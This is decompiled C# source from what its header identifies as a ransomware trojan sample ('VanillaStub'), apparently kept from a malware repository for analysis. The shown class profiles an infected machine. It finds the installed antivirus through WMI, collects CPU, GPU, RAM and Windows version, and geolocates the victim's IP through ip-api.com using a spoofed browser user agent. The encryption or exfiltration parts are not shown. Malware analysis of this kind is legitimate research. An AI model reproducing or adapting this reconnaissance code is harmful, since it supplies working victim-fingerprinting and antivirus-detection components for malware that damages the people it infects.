// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Information.ComputerInfo
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Json;
using System.Text;

namespace VanillaStub.Helpers.Information
{
  internal class ComputerInfo
  {
    public static GeoInfo GeoInfo { get; private set; }

    public static string RemoveLastChars(string input, int amount = 2)
    {
      if (input.Length > amount)
        input = input.Remove(input.Length - amount);
      return input;
    }

    public static string GetAntivirus()
    {
      try
      {
        string antivirus = string.Empty;
        bool flag = false;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct"))
        {
          foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
          {
            if (managementBaseObject.GetPropertyValue("displayName").ToString() == "Windows Defender")
              flag = true;
            if (managementBaseObject.GetPropertyValue("displayName").ToString() != "Windows Defender")
              antivirus = managementBaseObject.GetPropertyValue("displayName").ToString();
          }
          if (antivirus == string.Empty & flag)
            antivirus = "Windows Defender";
          if (antivirus == "")
            antivirus = "N/A";
          return antivirus;
        }
      }
      catch
      {
        return "N/A";
      }
    }

    public static string GetName() => Environment.MachineName;

    public static string GetGPU()
    {
      try
      {
        string input = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration"))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            input = input + managementObject["Description"] + " ;";
        }
        string str = ComputerInfo.RemoveLastChars(input);
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
        return "N/A";
      }
    }

    public static string GetCPU()
    {
      try
      {
        string input = string.Empty;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            input = input + managementObject["Name"] + "; ";
        }
        string str = ComputerInfo.RemoveLastChars(input);
        return !string.IsNullOrEmpty(str) ? str : "N/A";
      }
      catch
      {
      }
      return "N/A";
    }

    public static int GetRamAmount()
    {
      try
      {
        int ramAmount = 0;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              ramAmount = (int) (Convert.ToDouble(enumerator.Current["TotalPhysicalMemory"]) / 1048576.0);
          }
        }
        return ramAmount;
      }
      catch
      {
        return -1;
      }
    }

    public static void GetGeoInfo()
    {
      try
      {
        DataContractJsonSerializer contractJsonSerializer = new DataContractJsonSerializer(typeof (GeoInfo));
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("http://ip-api.com/json/");
        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
        httpWebRequest.Proxy = (IWebProxy) null;
        httpWebRequest.Timeout = 10000;
        using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
        {
          using (Stream responseStream = response.GetResponseStream())
          {
            using (StreamReader streamReader = new StreamReader(responseStream))
            {
              using (MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(streamReader.ReadToEnd())))
                ComputerInfo.GeoInfo = (GeoInfo) contractJsonSerializer.ReadObject((Stream) memoryStream);
            }
          }
        }
      }
      catch
      {
      }
      ComputerInfo.GeoInfo.Ip = string.IsNullOrEmpty(ComputerInfo.GeoInfo.Ip) ? "N/A" : ComputerInfo.GeoInfo.Ip;
      ComputerInfo.GeoInfo.Country = string.IsNullOrEmpty(ComputerInfo.GeoInfo.Country) ? "N/A" : ComputerInfo.GeoInfo.Country;
      ComputerInfo.GeoInfo.CountryCode = string.IsNullOrEmpty(ComputerInfo.GeoInfo.CountryCode) ? "-" : ComputerInfo.GeoInfo.CountryCode;
      ComputerInfo.GeoInfo.Region = string.IsNullOrEmpty(ComputerInfo.GeoInfo.Region) ? "N/A" : ComputerInfo.GeoInfo.Region;
      ComputerInfo.GeoInfo.City = string.IsNullOrEmpty(ComputerInfo.GeoInfo.City) ? "N/A" : ComputerInfo.GeoInfo.City;
      ComputerInfo.GeoInfo.Timezone = string.IsNullOrEmpty(ComputerInfo.GeoInfo.Timezone) ? "N/A" : ComputerInfo.GeoInfo.Timezone;
      ComputerInfo.GeoInfo.Isp = string.IsNullOrEmpty(ComputerInfo.GeoInfo.Isp) ? "N/A" : ComputerInfo.GeoInfo.Isp;
    }

    [DllImport("kernel32.dll")]
    private static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string moduleName);

    [DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    public static bool Is64BitOperatingSystem()
    {
      if (IntPtr.Size == 8)
        return true;
      IntPtr moduleHandle = ComputerInfo.GetModuleHandle("kernel32");
      bool wow64Process;
      return moduleHandle != IntPtr.Zero && ComputerInfo.GetProcAddress(moduleHandle, "IsWow64Process") != IntPtr.Zero && ComputerInfo.IsWow64Process(ComputerInfo.GetCurrentProcess(), out wow64Process) & wow64Process;
    }

    private static string HKLM_GetString(string key, string value)
    {
      try
      {
        return Registry.LocalMachine.OpenSubKey(key)?.GetValue(value).ToString() ?? string.Empty;
      }
      catch
      {
        return string.Empty;
      }
    }

    public static string GetWindowsVersion()
    {
      string str1;
      try
      {
        str1 = ComputerInfo.Is64BitOperatingSystem() ? "64-bit" : "32-bit";
      }
      catch (Exception ex)
      {
        str1 = "32/64-bit (Undetermined)";
      }
      string str2 = ComputerInfo.HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
      string str3 = ComputerInfo.HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
      string str4 = ComputerInfo.HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild");
      if (string.IsNullOrEmpty(str2))
        return string.Empty;
      return str2 + (!string.IsNullOrEmpty(str3) ? " " + str3 : string.Empty) + " " + str1 + " (OS Build " + str4 + ")";
    }
  }
}
